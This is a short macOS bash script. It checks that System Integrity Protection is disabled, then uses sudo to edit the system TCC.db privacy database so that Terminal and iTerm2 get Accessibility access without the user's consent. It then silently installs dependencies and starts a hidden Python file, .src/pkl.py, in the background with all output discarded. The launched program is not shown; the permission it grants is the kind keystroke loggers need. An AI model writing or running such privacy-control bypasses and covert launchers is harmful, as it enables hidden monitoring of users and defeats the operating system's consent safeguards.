#!/bin/bash
# author: Andrew Scott
# date: 9-3-2018

CAN_RUN_KEY=1
SHOULD_TRY_PERM=1
# check if macOS
OS=$(uname)
if ! [ $OS == "Darwin" ]; then
    exit 0
fi

# check version, must be greater than 10.12.x
# if version is valid check to ensure that SIP is disabled.
VERSION=$(sw_vers -productVersion)
MINOR=$(echo $VERSION | cut -d. -f2)
if [ $MINOR -ge 12 ]; then
    SIP=$(csrutil status)
    if [ "$SIP" == "System Integrity Protection status: enabled." ]; then
        exit 0
    fi
else 
    exit 0
fi

# set permissions for terminal to allow access for assistive devices
if [ $SHOULD_TRY_PERM == 1 ]; then
    sudo chmod 664 "/Library/Application Support/com.apple.TCC/TCC.db" &> /dev/null
    TRY1=$(sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" "INSERT or REPLACE INTO access VALUES('kTCCServiceAccessibility','com.apple.Terminal',0,1,1,NULL,NULL);" 2>&1)
    TRY2=$(sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" "INSERT or REPLACE INTO access VALUES('kTCCServiceAccessibility','com.googlecode.iterm2',0,1,1,NULL,NULL);" 2>&1)
    if [[ $TRY1 == *"Error"* ]] && [[ $TRY2 == *"Error"* ]]; then
        exit 0
    fi
fi

# install necessary libraries
pip install -r .src/requirements.txt &> /dev/null

# run script
python .src/pkl.py &

# exit
exit 0